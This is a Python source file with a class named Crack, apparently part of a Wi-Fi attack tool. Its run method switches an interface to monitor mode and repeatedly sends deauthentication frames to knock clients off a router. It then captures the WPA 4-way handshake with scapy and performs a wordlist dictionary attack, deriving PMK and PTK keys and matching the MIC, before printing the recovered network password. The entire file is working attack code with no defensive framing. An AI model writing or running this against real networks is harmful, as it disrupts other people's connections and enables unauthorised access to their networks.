
import hmac,hashlib,binascii
import scapy.all as scapy

class Crack:

    def a2b(self, s): return binascii.a2b_hex(s);
    def b2a(self, by): return binascii.b2a_hex(by);

    def PRF(self, key, A, B):
            nByte = 64
            i = 0
            R = b''
            while(i <= ((nByte * 8 + 159) / 160)):
                hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
                R = R + hmacsha1.digest()
                i += 1
            return R[0:nByte]
    
    def run(self, interface, router, devices, spoofer, password_file):
        
        interface.monitor_mode()
        interface.set_channel(router.get_channel())

        
        packets = []
        num = 0
        while True:
            num = num + 1
            for device in devices:
                spoofer.deauthentication(router, device, num)
                scapy.sniff(filter='ether proto 0x888e', prn=lambda x: packets.append(x), iface=interface.get_name(), count=4, timeout = 7)
                if packets != []:
                    break
            if packets != []:
                    break
        
      

        p1 = scapy.bytes_hex(packets[0]).decode()
        p2 = scapy.bytes_hex(packets[1]).decode()

        SSID   = router.get_ssid()
        passwd   = ""
        
        R1 = self.a2b(p1[162:226]) 
        R2 = self.a2b(p2[162:226]) 
        M1 = self.a2b(p1[80:92])
        M2 = self.a2b(p2[80:92]) 
        
        start = self.a2b(p2[128:290])
        end = self.a2b(p2[322:]) 
        
        with open(password_file) as f:
            for passwd in f:
                passwd = passwd[:-1]
                PMK = hashlib.pbkdf2_hmac('sha1', passwd.encode(), SSID.encode(), 4096, 32)  
                PTK = self.PRF(PMK,b"Pairwise key expansion",min(M1,M2)+max(M1,M2)+min(R1,R2)+max(R1,R2))
                KCK = PTK[0:16];

                
                MICRAW   = hmac.new(KCK,start+self.a2b("00000000000000000000000000000000")+end,hashlib.sha1)
                MICFOUND = p2[290:322] 
                MICCALC  = MICRAW.hexdigest()[0:32]
                
                if MICFOUND == MICCALC:
                    break

        print("SSID/PASS: ",SSID,"/",passwd)

        
        interface.managed_mode()
        
        return passwd
